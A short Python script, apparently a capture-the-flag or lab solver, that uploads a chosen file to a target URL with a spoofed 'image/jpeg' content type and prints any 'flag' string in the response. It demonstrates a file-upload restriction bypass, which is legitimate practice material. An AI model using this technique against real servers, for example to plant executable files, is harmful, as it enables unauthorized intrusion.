import requests
import argparse
import re

def upload_image(url, path):
    data = {'Upload': 'Upload', 'MAX_FILE_SIZE': 100000000}
    files = {'uploaded': (path, open(path, 'rb'), "image/jpeg")}
    request = requests.post(url, files=files, data=data)
    regex = re.search(r"flag.*?<", request.text, re.I)
    if regex:
        print(regex.group(0)[:-1])


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="The url to request")
    parser.add_argument("path", help="The file path to upload")
    args = parser.parse_args()
    upload_image(args.url, args.path)
